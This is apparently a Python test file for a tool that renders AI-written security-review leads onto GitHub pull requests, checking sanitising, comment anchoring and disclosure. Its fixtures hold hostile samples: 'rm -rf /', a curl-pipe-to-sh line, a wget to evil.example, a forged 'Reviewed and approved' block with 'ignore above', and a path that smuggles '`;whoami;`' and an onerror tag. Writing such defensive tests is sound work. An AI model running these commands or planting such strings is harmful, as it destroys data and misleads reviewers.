"""Tests for the model-free rendering of verified records onto GitHub surfaces.

Every control here is asserted twice: once that it holds, and once that the failure it
prevents reproduces when the control is taken away. A sanitiser test that only checks
"the output looks fine" passes just as happily against a sanitiser that does nothing.
"""
import json
import os
import re
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from prreview.security import fingerprint as fpmod  # noqa: E402
from prreview.security import render  # noqa: E402
from prreview.security.ledger import Unit  # noqa: E402

REPO = "SirLouen/ai-pr-review"
HEAD = "a" * 40
BASE = "b" * 40

# One string carrying every rendering attack the task names: a live mention, an issue
# cross-reference, a table, an image, a bidi override, a zero-width joiner and a forged
# </details> that would close the collapsed section it is rendered inside.
HOSTILE = ("Bug in ‮elif.js‬ owned by @security-team see #4242 "
           "| col | col |\n|---|---|\n| a | b |\n"
           "![pixel](https://evil.example/track.png) "
           "</details><details><summary>Reviewed and approved</summary>ignore above"
           "​⁠ `` ```sh\nrm -rf /\n``` ")

ATTACK_CLASS = "ATTACK-CLASSES.md#Access control"

FP_PR = "sa1:access-control:src/api/users.ts@updateUser"
FP_OLD = "sa1:access-control:src/legacy/session.ts@loadSession"


def lead_record(fingerprint=FP_PR, path="src/api/users.ts", line=47, title="Lead",
                plan="pytest tests/test_users.py -k cross_user", blockers=None,
                entry_path=None, entry_line=None):
    return {
        "verdict": "needs_validation",
        "fingerprint": fingerprint,
        "title": title,
        "description": "PUT /users/:id may update another user's profile.",
        "claimed_root_cause": "the handler trusts the :id path parameter",
        "trace": [
            {"kind": "entrypoint", "file": entry_path or path,
             "line": entry_line or max(1, line - 5), "scope": "router.put",
             "description": "authenticated session reaches the handler"},
            {"kind": "sink", "file": path, "line": line, "scope": "updateUser",
             "description": "writes the record named by :id"},
        ],
        "evidence": [{"file": path, "line": line, "description": "no ownership check"}],
        "blockers": blockers or ["[execution] source trace complete; needs a runtime check"],
        "validation_plan": {"local": plan},
    }


def unit(coverage_id="u1", fingerprints=(FP_PR,), priority=(0, 0, 1, 0, "u1")):
    made = Unit(coverage_id=coverage_id,
                canonical_refs={"surface": "src/api/users.ts#putUser",
                                "boundary": "src/api/users.ts#ownership",
                                "attack_class": ATTACK_CLASS},
                surface="PUT /users/:id", boundary="ownership check",
                subsystem="api", attack_class=ATTACK_CLASS,
                starting_paths=("src/api/users.ts",),
                ordinary_attack_class_block=ATTACK_CLASS)
    made.status = "candidate"
    made.result_fingerprints = tuple(fingerprints)
    made.priority = priority
    return made


def diff_index(path="src/api/users.ts", new_start=40, new_lines=12):
    return render.DiffIndex([{"path": path, "old_path": None,
                              "hunks": [{"old_start": 40, "old_lines": 3,
                                         "new_start": new_start,
                                         "new_lines": new_lines}]}])


def report(**kwargs):
    kwargs.setdefault("repository", REPO)
    kwargs.setdefault("pr_number", 7)
    kwargs.setdefault("head_sha", HEAD)
    kwargs.setdefault("merge_base_sha", BASE)
    kwargs.setdefault("findings", [lead_record()])
    kwargs.setdefault("units", [unit()])
    kwargs.setdefault("diff", diff_index())
    kwargs.setdefault("coverage", {"units": 3, "by_status": {"covered": 1,
                                                             "candidate": 1,
                                                             "deferred": 1}})
    # Disclosure is the subject of its own test class; everywhere else the default is
    # the private-repo case so that a filtering bug cannot masquerade as a render bug.
    kwargs.setdefault("disclosure", render.Disclosure(mode="all", public=False))
    return render.RunReport(**kwargs)


# --------------------------------------------------------------------- sanitiser

class SanitiserTest(unittest.TestCase):

    def test_hostile_record_text_renders_inert(self):
        out = render.sanitize_for_github(HOSTILE, limit=4000)
        # (a) no live mention or issue cross-reference survives.
        self.assertNotIn("@", out)
        self.assertNotIn("#4242", out)
        self.assertIn("&#64;security-team", out)
        self.assertIn("&#35;4242", out)
        # (b) bidi and zero-width characters are gone.
        for ch in ("‮", "‬", "​", "⁠"):
            self.assertNotIn(ch, out)
        # (c) links and images are defanged.
        self.assertNotIn("https://", out)
        self.assertIn("https&#58;//", out)
        self.assertNotIn("![", out)
        # (d) no forged structure: no table row, no details block, no fence.
        self.assertNotIn("</details>", out)
        self.assertIn("&lt;/details&gt;", out)
        self.assertNotRegex(out, r"(?<!\\)\|")
        self.assertNotIn("```", out)
        self.assertNotRegex(out, r"(?m)^#")

    def test_control_removed_reproduces_each_failure(self):
        # Without the sanitiser the same string carries every live construct, so the
        # assertions above are about the control and not about a harmless fixture.
        self.assertIn("@security-team", HOSTILE)
        self.assertIn("#4242", HOSTILE)
        self.assertIn("‮", HOSTILE)
        self.assertIn("</details>", HOSTILE)
        self.assertIn("![pixel](https://evil.example/track.png)", HOSTILE)
        self.assertIn("| col | col |", HOSTILE)
        self.assertIn("```", HOSTILE)

    def test_entity_form_survives_a_later_format_character_strip(self):
        out = render.sanitize_for_github("ping @security-team about #9")
        self.assertEqual(render.strip_unsafe_characters(out), out)
        self.assertNotRegex(render.strip_unsafe_characters(out), r"(?<!&#64;)@\w")
        # The rejected alternative: a U+2060 separator is a format character, so the
        # very same strip restores a live mention. This is why entities are used.
        joiner = "ping @⁠security-team about #⁠9"
        self.assertNotIn("@security-team", joiner)
        self.assertIn("@security-team", render.strip_unsafe_characters(joiner))
        self.assertIn("#9", render.strip_unsafe_characters(joiner))

    def test_repo_derived_paths_are_escaped_and_capped(self):
        hostile_path = ("src/@org-team/<img src=x onerror=1>/`;whoami;`/"
                        "a\nb|c#d.ts" + "x" * 500)
        out = render.sanitize_path(hostile_path)
        self.assertNotIn("@", out)
        self.assertNotIn("<img", out)
        self.assertNotRegex(out, r"(?<!\\)\|")
        self.assertNotIn("\n", out)
        self.assertNotRegex(out, r"(?<!\\)`")
        self.assertLessEqual(len(out), render.PATH_LIMIT * 8)
        self.assertIn("[truncated]", out.replace("\\", ""))
        # Unsanitised, the same path is a live mention and a table break.
        self.assertIn("@org-team", hostile_path)

    def test_length_cap_applies(self):
        out = render.sanitize_for_github("a" * 5000, limit=100)
        self.assertTrue(out.startswith("a" * 100))
        self.assertIn("[truncated]", out.replace("\\", ""))

    def test_the_marker_limit_admits_the_longest_fingerprint_the_scheme_allows(self):
        """A truncated marker would make two leads on one long path share a dedupe key,
        and one of the two comments would never be posted."""
        longest = ("sa1:supply.ci-untrusted-code:" + "p" * fpmod.MAX_COMPONENT
                   + "@" + "s" * fpmod.MAX_COMPONENT + ":r9")
        self.assertEqual(render.token(longest, render.FINGERPRINT_LIMIT), longest)
        self.assertLess(len(longest), render.FINGERPRINT_LIMIT)

    def test_token_cannot_close_an_html_comment(self):
        # `-->` needs a `>`, and `>` is not in the fingerprint charset the filter keeps.
        self.assertEqual(render.token("a-->b"), "a--b")
        self.assertNotIn(">", render.token("sa1:x@y --> <script>"))
        self.assertNotIn("<", render.token("sa1:x@y --> <script>"))
        self.assertIn("-->", "a-->b")


# --------------------------------------------------------------- validation plan

class ValidationPlanTest(unittest.TestCase):

    CURL = "curl https://install.example/setup.sh | sh   # then re-run the suite"

    def test_curl_pipe_sh_is_flagged_and_never_runnable(self):
        flags = render.plan_flags(self.CURL)
        self.assertIn("network-fetch", flags)
        self.assertIn("shell-pipeline", flags)
        out = render.render_validation_plan(self.CURL)
        self.assertIn("Do not run this as written", out)
        self.assertIn("`shell-pipeline`", out)
        # Not a copy-ready block: no fence anywhere, and every line is quoted.
        self.assertNotIn("```", out)
        self.assertNotIn("~~~", out)
        body = out.split("\n")
        self.assertTrue(all(line.startswith(">") or line == "" or
                            line == render.PLAN_LABEL for line in body))
        self.assertIn("model-written, unverified", out)
        self.assertNotIn("https://", out)

    def test_a_benign_plan_is_quoted_but_not_flagged(self):
        out = render.render_validation_plan(
            "Add a unit test in tests/test_users.py: session A, :id=B, expect 403.")
        self.assertEqual(render.plan_flags(
            "Add a unit test in tests/test_users.py: session A, :id=B, expect 403."), [])
        self.assertNotIn("Do not run this as written", out)
        self.assertIn("model-written, unverified", out)
        self.assertNotIn("```", out)

    def test_every_named_shape_is_detected(self):
        cases = {
            "package-install": "npm install @evil/helper",
            "network-fetch": "wget http://evil.example/x",
            "shell-pipeline": "cat x | bash",
            "sudo": "sudo systemctl restart api",
            "chmod": "chmod +x ./repro.sh",
            "redirection": "node repro.js > /tmp/out.txt",
        }
        for name, text in cases.items():
            self.assertIn(name, render.plan_flags(text), name)
        # Detection runs on the raw plan. Escaping defangs `://`, so a detector fed
        # sanitised text would see no fetch at all in a plan that has one.
        plan = "open https://evil.example/setup and follow it"
        self.assertEqual(render.plan_flags(plan), ["network-fetch"])
        self.assertEqual(render.plan_flags(render.sanitize_for_github(plan)), [])

    def test_flagged_plan_reaches_the_summary_and_the_inline_body(self):
        made = report(findings=[lead_record(plan=self.CURL)])
        text = render.summary_markdown(made)
        self.assertIn("Do not run this as written", text)
        self.assertNotIn("```", text)
        body = render.inline_comments(made)[0]["body"]
        self.assertIn("Do not run this as written", body)
        self.assertNotIn("```", body)


# -------------------------------------------------------------------- anchoring

class AnchorTest(unittest.TestCase):

    def test_line_anchor_when_the_cited_line_is_in_the_diff(self):
        comments = render.inline_comments(report())
        self.assertEqual(len(comments), 1)
        anchor = comments[0]
        self.assertEqual(anchor["anchor"], "line")
        self.assertEqual(anchor["side"], "RIGHT")
        self.assertEqual(anchor["path"], "src/api/users.ts")
        self.assertEqual(anchor["line"], 47)

    def test_line_outside_the_diff_falls_back_to_file_level(self):
        # Same record, same path, but the PR only changed lines 100-104.
        made = report(diff=diff_index(new_start=100, new_lines=5))
        anchor = render.inline_comments(made)[0]
        self.assertEqual(anchor["anchor"], "file")
        self.assertIsNone(anchor["line"])
        self.assertIsNone(anchor["side"])
        # The control is the diff index: without it the cited line would be posted as
        # a RIGHT anchor and 422 the whole review.
        self.assertFalse(made.diff.right("src/api/users.ts", 47))
        self.assertTrue(diff_index().right("src/api/users.ts", 47))

    def test_path_outside_the_diff_falls_back_to_summary_only(self):
        made = report(diff=diff_index(path="other/file.ts"))
        anchor = render.inline_comments(made)[0]
        self.assertEqual(anchor["anchor"], "summary")
        self.assertEqual(anchor["path"], "")
        self.assertIsNone(anchor["line"])

    def test_no_diff_index_at_all_yields_summary_only(self):
        anchor = render.inline_comments(report(diff=None))[0]
        self.assertEqual(anchor["anchor"], "summary")

    def test_sink_is_preferred_then_evidence_then_back_up_the_trace(self):
        record = lead_record(entry_path="src/api/router.ts", entry_line=12)
        # Only the entrypoint file is in the diff, so the fallback walks the trace.
        made = report(findings=[record],
                      diff=render.DiffIndex([{"path": "src/api/router.ts",
                                              "hunks": [{"old_start": 10, "old_lines": 1,
                                                         "new_start": 10,
                                                         "new_lines": 6}]}]))
        anchor = render.inline_comments(made)[0]
        self.assertEqual((anchor["path"], anchor["line"], anchor["side"]),
                         ("src/api/router.ts", 12, "RIGHT"))

    def test_deleted_control_anchor_is_opt_in(self):
        deleted = render.DiffIndex([{"path": "src/api/users.ts",
                                     "hunks": [{"old_start": 45, "old_lines": 4,
                                                "new_start": 46, "new_lines": 0}]}])
        made = report(diff=deleted)
        self.assertEqual(render.inline_comments(made)[0]["anchor"], "file")
        opted = render.inline_comments(made, allow_deleted_control=True)[0]
        self.assertEqual((opted["side"], opted["line"]), ("LEFT", 45))

    def test_body_carries_the_marker_and_the_not_a_severity_statement(self):
        anchor = render.inline_comments(report())[0]
        self.assertTrue(anchor["body"].startswith("<!-- sa-fp:"))
        self.assertIn("rh:%s" % anchor["record_hash"], anchor["body"])
        self.assertIn("not a confirmed vulnerability", anchor["body"])
        self.assertIn("It is **not** a severity", anchor["body"])

    def test_every_inline_body_frames_the_run_as_partial(self):
        for anchor in render.inline_comments(report()):
            self.assertIn("partial, diff-scoped, quick-profile pass", anchor["body"])
            self.assertIn("does not block a merge by default", anchor["body"])
            self.assertIn("no severity", anchor["body"])

    def test_summary_only_disclosure_emits_no_inline_comments(self):
        made = report(disclosure=render.Disclosure(mode="summary-only", public=False))
        self.assertEqual(render.inline_comments(made), [])

    def test_each_anchor_carries_the_candidates_the_publish_job_re_checks(self):
        """Publish re-anchors against the live patch, so it needs the whole ordered
        list, not only the line this index happened to accept."""
        anchor = render.inline_comments(report())[0]
        self.assertEqual(anchor["candidates"][0], ["src/api/users.ts", 47])
        self.assertIn(["src/api/users.ts", 42], anchor["candidates"])

    def test_the_same_leads_re_anchor_against_a_live_index(self):
        """Same report, same logic, a different diff: only the anchor moves."""
        made = report()
        live = render.DiffIndex([{"filename": "src/api/users.ts",
                                  "patch": "@@ -1,2 +1,3 @@\n+x\n"}])
        stale = render.inline_comments(made)[0]
        fresh = render.inline_comments(made, diff=live)[0]
        self.assertEqual((stale["anchor"], stale["line"]), ("line", 47))
        self.assertEqual(fresh["anchor"], "file")
        self.assertEqual(stale["body"], fresh["body"])

    def test_select_anchor_works_on_a_raw_record_with_no_report(self):
        """The publish job has records and a live index, not a report."""
        candidates = render.anchor_candidates(lead_record())
        self.assertEqual(candidates[0], ("src/api/users.ts", 47))
        self.assertEqual(render.select_anchor(candidates, diff_index()),
                         {"anchor": "line", "path": "src/api/users.ts", "line": 47,
                          "side": "RIGHT"})
        self.assertEqual(render.select_anchor(candidates, None)["anchor"], "summary")
        seeded = render.anchor_candidates({}, seeded=[("src/api/users.ts", 47)])
        self.assertEqual(seeded, [("src/api/users.ts", 47)])
        self.assertEqual(render.anchor_candidates({}, seeded=[("x.ts", None)]), [])


# ------------------------------------------------------------------- disclosure

class DisclosureTest(unittest.TestCase):

    def both(self, **kwargs):
        findings = [lead_record(), lead_record(fingerprint=FP_OLD,
                                               path="src/legacy/session.ts", line=8,
                                               title="Legacy session fixation")]
        units = [unit(), unit("u2", (FP_OLD,), (1, 1, 1, 1, "u2"))]
        return report(findings=findings, units=units, **kwargs)

    def test_auto_on_a_public_repo_withholds_pre_existing_leads_and_fingerprints(self):
        made = self.both(disclosure=render.Disclosure(mode="auto", public=True,
                                                      key=b"run-key"))
        self.assertEqual([lead.introduced for lead in made.leads],
                         ["pr", "pre_existing"])
        self.assertEqual([lead.fingerprint for lead in made.published], [FP_PR])
        text = render.summary_markdown(made)
        self.assertNotIn("Legacy session fixation", text)
        self.assertNotIn("src/legacy/session.ts", text)
        self.assertNotIn(FP_OLD, text)
        self.assertNotIn("loadSession", text)
        # Not even the withheld lead's handle appears: it is referenced only in the
        # aggregate count, which is all the public surface may say about it.
        self.assertNotIn(made.disclosure.handle(FP_OLD), text)
        # The PUBLISHED lead is named by its real fingerprint. Its own entry two lines
        # up already prints `src/api/users.ts line 47`, so class:path@symbol adds
        # nothing that the surface did not already say.
        self.assertIn(render.reference_markup(FP_PR), text)
        self.assertIn("withheld from this public surface", text.replace("\n", " "))

    def test_withholding_every_lead_does_not_claim_there_were_none(self):
        made = report(findings=[lead_record(fingerprint=FP_OLD,
                                            path="src/legacy/session.ts", line=8,
                                            title="Legacy session fixation")],
                      units=[unit("u2", (FP_OLD,))],
                      disclosure=render.Disclosure(mode="auto", public=True))
        text = render.summary_markdown(made)
        self.assertEqual(made.published, [])
        self.assertNotIn("No lead survived verification", text)
        self.assertIn("withheld from this public surface", text.replace("\n", " "))

    def test_all_mode_publishes_everything_with_raw_fingerprints(self):
        made = self.both(disclosure=render.Disclosure(mode="all", public=True))
        text = render.summary_markdown(made)
        self.assertIn("Legacy session fixation", text)
        # Disclosed, but still entity-escaped: `@symbol` is a plausible login.
        self.assertIn(render.reference_markup(FP_OLD), text)
        self.assertIn(render.reference_markup(FP_PR), text)
        self.assertIn("&#64;updateUser", text)
        self.assertNotIn("@", text)
        self.assertEqual(len(made.published), 2)

    def test_private_repo_auto_publishes_everything(self):
        made = self.both(disclosure=render.Disclosure(mode="auto", public=False))
        self.assertEqual(len(made.published), 2)
        self.assertIn(render.reference_markup(FP_OLD), render.summary_markdown(made))

    def test_a_fingerprint_with_no_comment_is_named_by_a_handle(self):
        # An HMAC keyed by anything the comment already prints -- the head sha -- is a
        # commitment an attacker can confirm against a guessed class:path@symbol. The
        # default handle is an index, so a guess cannot be checked against it at all.
        made = self.both(disclosure=render.Disclosure(mode="auto", public=True),
                         unvalidated=[FP_OLD])
        text = render.summary_markdown(made)
        reference = made.withheld_reference(FP_OLD)
        self.assertRegex(reference, r"^L\d+$")
        self.assertIn("- %s - never validated" % reference, text)
        self.assertNotIn(FP_OLD, text)
        self.assertNotIn("loadSession", text)
        keyed = render.Disclosure(mode="auto", public=True, key=b"per-repo-secret")
        self.assertTrue(keyed.handle(FP_PR).startswith("sa-"))
        self.assertNotEqual(keyed.handle(FP_PR), keyed.handle(FP_OLD))

    def test_a_private_surface_names_even_those_in_full(self):
        """Control removed: the handle is the public-repo `auto` case, nothing else."""
        made = self.both(disclosure=render.Disclosure(mode="all", public=True),
                         unvalidated=[FP_OLD])
        self.assertIn(render.reference_markup(FP_OLD), render.summary_markdown(made))

    def test_the_dedupe_marker_carries_the_real_fingerprint_not_a_handle(self):
        """A posted lead prints its own file and line, so its fingerprint reveals
        nothing further -- and the handle is a position in one run, so a marker built
        from it would change on the next push and repost every comment."""
        pair = self.both(disclosure=render.Disclosure(mode="auto", public=True))
        anchor = render.inline_comments(pair)[0]
        self.assertEqual(anchor["fingerprint"], FP_PR)
        self.assertEqual(anchor["body"].split("\n")[0],
                         render.INLINE_MARKER % (FP_PR, pair.published[0].record_hash))

        alone = report(findings=[lead_record()], units=[unit()],
                       disclosure=render.Disclosure(mode="auto", public=True))
        earlier = "sa1:access-control:src/api/aaa.ts@f"
        crowded = report(findings=[lead_record(), lead_record(fingerprint=earlier,
                                                              path="src/api/aaa.ts")],
                         units=[unit(), unit("u3", (earlier,))],
                         disclosure=render.Disclosure(mode="auto", public=True))
        # Same lead, same marker, whatever else the run found...
        self.assertEqual(render.inline_comments(alone)[0]["body"].split("\n")[0],
                         render.inline_comments(crowded)[0]["body"].split("\n")[0])
        # ...while the handle for that very fingerprint moves, which is the failure a
        # handle-keyed marker would produce: every lead reposted on every push.
        self.assertNotEqual(alone.withheld_reference(FP_PR),
                            crowded.withheld_reference(FP_PR))

    def test_handles_are_stable_within_a_run_and_differ_between_runs(self):
        one = render.Disclosure(mode="auto", public=True, key=b"head-1")
        two = render.Disclosure(mode="auto", public=True, key=b"head-2")
        self.assertEqual(one.handle(FP_PR), one.handle(FP_PR))
        self.assertNotEqual(one.handle(FP_PR), two.handle(FP_PR))
        self.assertNotIn("users.ts", one.handle(FP_PR))

    def test_the_sidecar_names_published_leads_and_omits_withheld_ones(self):
        opaque = self.both(disclosure=render.Disclosure(mode="auto", public=True))
        sidecar = render.annotations_sidecar(opaque)
        self.assertEqual(len(sidecar["leads"]), 1)
        # A published lead: reference and fingerprint agree, and both are the real one.
        self.assertEqual(sidecar["leads"][0]["reference"], FP_PR)
        self.assertEqual(sidecar["leads"][0]["fingerprint"], FP_PR)
        # Withholding is what keeps the pre-existing lead off a public surface, and it
        # works by leaving it out entirely -- not by renaming it.
        self.assertNotIn(FP_OLD, json.dumps(sidecar))
        self.assertNotIn("src/legacy/session.ts", json.dumps(sidecar))
        self.assertEqual(sidecar["disclosure"]["withheld"], 1)
        self.assertIsNone(sidecar["severity"])
        full = self.both(disclosure=render.Disclosure(mode="all", public=False))
        self.assertEqual(len(render.annotations_sidecar(full)["leads"]), 2)

    def test_withheld_leads_never_reach_inline_comments_or_sarif(self):
        made = self.both(disclosure=render.Disclosure(mode="auto", public=True))
        bodies = " ".join(anchor["body"] for anchor in render.inline_comments(made))
        self.assertNotIn("Legacy session fixation", bodies)
        self.assertNotIn(FP_OLD, bodies)
        document = json.dumps(render.sarif(made, enabled=True))
        self.assertNotIn("src/legacy/session.ts", document)
        self.assertNotIn(FP_OLD, document)


# ---------------------------------------------------------------------- summary

class SummaryTest(unittest.TestCase):

    def test_partial_statement_and_not_reviewed_list_are_unconditional(self):
        for made in (report(), report(findings=[], units=[], omissions=[],
                                      not_reviewed=[])):
            text = render.summary_markdown(made)
            self.assertIn("partial, diff-scoped, quick-profile pass", text)
            self.assertIn("No pull-request code was executed", text)
            self.assertIn("nothing has a severity", text)
            self.assertIn("a green check is not a clean bill", text)
            self.assertIn("Not reviewed (", text)
        empty = render.summary_markdown(report(findings=[], units=[]))
        self.assertIn("Not reviewed (0)", empty)
        self.assertIn("This still covers only", empty)

    def test_not_reviewed_itemises_size_binary_budget_and_size_gate_skips(self):
        omissions = [{"kind": "oversize", "path": "dist/bundle.min.js",
                      "detail": "2.4 MiB"},
                     {"kind": "binary", "path": "img/logo.png"},
                     {"kind": "tool_budget_exhausted", "path": ""},
                     {"kind": "hunks_omitted", "path": "vendor/big.go"},
                     {"kind": "size_gate", "path": "docs/huge.md"}]
        text = render.summary_markdown(report(omissions=omissions))
        self.assertIn("Not reviewed (5)", text)
        for path in ("dist/bundle.min.js", "img/logo.png", "vendor/big.go",
                     "docs/huge.md"):
            self.assertIn(path, text)
        self.assertIn("over the blob read limit", text)
        self.assertIn("tool-output budget exhausted", text)
        self.assertIn("PR-size gate", text)
        # Drop the omissions and the same files are simply absent -- which is the
        # failure this section exists to prevent.
        bare = render.summary_markdown(report(omissions=[]))
        self.assertNotIn("dist/bundle.min.js", bare)

    def test_deferred_and_out_of_scope_units_are_listed_and_counted(self):
        not_reviewed = [{"kind": "unit", "coverage_id": "u9", "status": "deferred",
                         "starting_paths": ["src/jobs/worker.ts"],
                         "reason": "budget_cannot_reserve_critics_and_validation"},
                        {"kind": "unit", "coverage_id": "u8", "status": "out_of_scope",
                         "starting_paths": ["src/old/legacy.ts"], "reason": "not in diff"}]
        text = render.summary_markdown(report(not_reviewed=not_reviewed))
        self.assertIn("src/jobs/worker.ts", text)
        self.assertIn("budget&#95;cannot&#95;reserve&#95;critics&#95;and&#95;validation"
                      .replace("&#95;", "\\_"), text)
        self.assertIn("out&#95;of&#95;scope".replace("&#95;", "\\_"), text)
        self.assertIn("1 covered, 1 candidate, 1 deferred", text)

    def test_unrepresentable_paths_get_their_own_named_section(self):
        made = report(not_reviewed=[{"kind": "path", "path": "src/aux/handler.ts",
                                     "status": "unrepresentable",
                                     "reason": "validator rejects this path"}])
        text = render.summary_markdown(made)
        self.assertIn("Cannot be reported (unrepresentable path) (1)", text)
        self.assertIn("src/aux/handler.ts", text)
        self.assertNotIn("<details><summary><strong>Cannot be reported", text)

    def test_leads_carry_order_location_boundary_blockers_and_local_plan(self):
        text = render.summary_markdown(report(
            disclosure=render.Disclosure(mode="all", public=False)))
        self.assertIn("Leads that need validation (1)", text)
        self.assertIn("**Order\\*:** P1", text)
        self.assertIn("src/api/users.ts line 47", text)
        self.assertIn("https://github.com/%s/blob/%s/src/api/users.ts#L47" % (REPO, HEAD),
                      text)
        self.assertIn("router.put -> updateUser", text)
        self.assertIn("[execution]", text.replace("\\[", "[").replace("\\]", "]"))
        self.assertIn("To settle it locally", text)
        self.assertIn("It is **not** a severity", text.replace("\n", " "))
        self.assertIn("introduced or modified by this pull request", text)

    def test_rejected_records_are_collapsed_and_reasonless_by_default(self):
        rejected = {"verdict": "rejected", "fingerprint": "sa1:injection:src/a.ts@f",
                    "title": "SQL injection in the search handler",
                    "description": "d", "claimed_root_cause": "c",
                    "trace": [], "evidence": [],
                    "reason": "the query is parameterised at src/a.ts:12"}
        made = report(findings=[lead_record(), rejected])
        text = render.summary_markdown(made)
        self.assertIn("Claims that did not survive verification (1)", text)
        self.assertIn("<details><summary><strong>Claims that did not survive", text)
        self.assertIn("SQL injection in the search handler", text)
        self.assertNotIn("the query is parameterised", text)
        shown = render.summary_markdown(report(findings=[lead_record(), rejected],
                                               show_rejected=True))
        self.assertIn("the query is parameterised", shown)

    def test_deviations_and_cost_and_latency_are_reported(self):
        made = report(deviations=["SKILL.md:123 - reconnaissance is baseline-delta"],
                      usage={"usd": 0.31, "max_usd": 1.5, "conversations": 7,
                             "max_conversations": 14, "latency_s": 312,
                             "models": {"hunter": "deepseek-flash"}})
        text = render.summary_markdown(made)
        self.assertIn("Deviations from the security-audit skill (1)", text)
        self.assertIn("reconnaissance is baseline-delta", text)
        self.assertIn("$0.31 of $1.50 ceiling", text)
        self.assertIn("Conversations: 7 of 14", text)
        self.assertIn("5m 12s", text)
        self.assertIn("hunter=deepseek-flash", text)

    def test_incomplete_run_says_so_first(self):
        made = report(run_status="incomplete",
                      incomplete_reason="validation_budget_exhausted",
                      unvalidated=["sa1:injection:src/a.ts@f"])
        text = render.summary_markdown(made)
        self.assertIn("**Incomplete run**", text)
        self.assertIn("validation", text)
        self.assertIn("Claims with no final disposition (1)", text)
        self.assertIn("These are **not findings**", text)

    def test_hostile_record_text_cannot_break_the_summary_structure(self):
        made = report(findings=[lead_record(title=HOSTILE, plan=HOSTILE)],
                      disclosure=render.Disclosure(mode="all", public=False))
        text = render.summary_markdown(made)
        # Only parent-built collapsed sections exist, and their count is what we wrote.
        self.assertEqual(text.count("<details>"), text.count("</details>"))
        # Exactly the three the parent wrote: Not reviewed, Deviations, Coverage.
        self.assertEqual(text.count("</details>"), 3)
        # The forged block survives only as escaped text, never as live markup.
        self.assertIn("&lt;details&gt;&lt;summary&gt;Reviewed and approved", text)
        self.assertNotIn("<summary>Reviewed", text)
        self.assertNotIn("@security-team", text)
        self.assertNotIn("```", text)
        headings = [line for line in text.split("\n") if line.startswith("#")]
        self.assertTrue(all(line.startswith(("## ", "### ", "#### "))
                            for line in headings), headings)

    def test_summary_is_capped_and_closes_what_it_cuts(self):
        wordy = [lead_record(fingerprint="sa1:access-control:src/f%03d.ts@h" % n,
                             path="src/f%03d.ts" % n,
                             title="Lead %d " % n + "x" * 400,
                             plan="|".join("step %d" % i for i in range(400)),
                             blockers=["[execution] " + "y" * 400 for _ in range(6)])
                 for n in range(60)]
        text = render.summary_markdown(report(findings=wordy, units=[], diff=None))
        self.assertLessEqual(len(text), render.SUMMARY_LIMIT)
        self.assertIn("reached GitHub's length limit", text)
        # A cut inside a collapsed section would hide the notice that says it was cut.
        self.assertEqual(text.count("<details>"), text.count("</details>"))
        # And the cap is the control: without it the same input runs well past it.
        self.assertGreater(sum(len(part) for part in render._leads_section(
            report(findings=wordy, units=[], diff=None))), render.SUMMARY_LIMIT)

    def test_marker_is_distinct_and_present(self):
        text = render.summary_markdown(report())
        self.assertIn("<!-- ai-security-review v1 run=", text)
        self.assertNotIn("ai-verified-review", text)


# --------------------------------------------------- what the publish job posts

class PublishSurfaceTest(unittest.TestCase):
    """The publish job writes no text of its own, so its surfaces are tested here."""

    def test_a_rendered_summary_is_posted_whole_and_never_escaped_again(self):
        rendered = render.summary_markdown(report(findings=[lead_record(title="a & b")]))
        framed = render.framed_summary(rendered, run_id="pr7", head_sha=HEAD)
        self.assertEqual(framed, rendered.strip())
        # The failure a second sanitiser pass would produce: the reader sees the
        # escape sequence instead of the character. `&` is escaped exactly once.
        self.assertIn("a &amp; b", framed)
        self.assertNotIn("&amp;amp;", framed)

    def test_a_summary_that_is_not_inert_is_dropped_and_framed(self):
        framed = render.framed_summary(
            (render.MARKER % "pr7") + "\npartial severity ![x](https://evil.example/x)",
            run_id="pr7", head_sha=HEAD)
        self.assertIn("did not pass the publish-side inertness check", framed)
        self.assertNotIn("![", framed)
        self.assertIn("AI security review (partial)", framed)

    def test_a_summary_with_no_framing_is_framed_rather_than_posted_bare(self):
        framed = render.framed_summary("Bundle summary.", run_id="pr7", head_sha=HEAD)
        self.assertIn("Bundle summary.", framed)
        self.assertEqual(render.framing_problems(framed), [])
        # Control: a document that already carries marker and framing is left alone.
        whole = (render.MARKER % "pr7") + "\n" + render.PARTIAL_NOTICE
        self.assertEqual(render.framed_summary(whole, run_id="pr7", head_sha=HEAD),
                         whole)

    def test_an_incomplete_run_says_so_even_when_the_summary_is_unusable(self):
        framed = render.framed_summary("", run_id="pr7", head_sha=HEAD,
                                       run_status="incomplete",
                                       incomplete_reason="validation_budget_exhausted")
        self.assertIn(render.INCOMPLETE_HEADING, framed)
        self.assertIn("validation", framed)

    def test_an_incomplete_run_is_marked_under_a_usable_document_that_omitted_it(self):
        """The bundle is untrusted, so a summary that left the gap out does not get to
        make the run look complete -- and the line goes where it is read."""
        whole = (render.MARKER % "pr7") + "\n\n" + render.PARTIAL_NOTICE
        framed = render.framed_summary(whole, run_id="pr7", head_sha=HEAD,
                                       run_status="incomplete",
                                       incomplete_reason="tool_budget_exhausted")
        lines = [line for line in framed.split("\n") if line.strip()]
        self.assertTrue(lines[0].startswith(render.MARKER_PREFIX))
        self.assertIn(render.INCOMPLETE_HEADING, lines[2])
        self.assertIn(render.PARTIAL_NOTICE, framed)
        # Control: a document that already carries the line is not given a second one.
        said = render.summary_markdown(report(run_status="incomplete",
                                              incomplete_reason="tool_budget_exhausted"))
        again = render.framed_summary(said, run_id="pr7", head_sha=HEAD,
                                      run_status="incomplete",
                                      incomplete_reason="tool_budget_exhausted")
        self.assertEqual(again.count(render.INCOMPLETE_HEADING), 1)

    def test_the_extra_sections_name_what_could_not_be_posted(self):
        unanchored = render.unanchored_section([FP_PR])
        self.assertIn("could not be anchored (1)", unanchored)
        self.assertIn(render.reference_markup(FP_PR), unanchored)
        self.assertNotIn("@", unanchored)
        self.assertEqual(render.unanchored_section([]), "")
        suppression = render.suppression_section(["L4"])
        self.assertIn("Not re-reported, source unchanged (1)", suppression)
        self.assertIn("not evidence of a fix", suppression)
        self.assertEqual(render.suppression_section([]), "")

    def test_a_body_rebuilt_from_a_record_is_inert_framed_and_marked(self):
        body = render.rebuild_lead_body(lead_record(title=HOSTILE, plan=HOSTILE),
                                        FP_PR, repository=REPO, head_sha=HEAD)
        self.assertTrue(body.startswith("<!-- sa-fp:%s " % FP_PR))
        self.assertEqual(render.inert_problems(body), [])
        self.assertEqual(render.framing_problems(body), [])
        self.assertIn("To settle it locally", body)
        self.assertNotIn("```", body)
        self.assertNotIn("@", re.sub(r"<!--.*?-->", "", body, flags=re.S))

    def test_a_rebuilt_body_with_no_repository_still_names_the_trace(self):
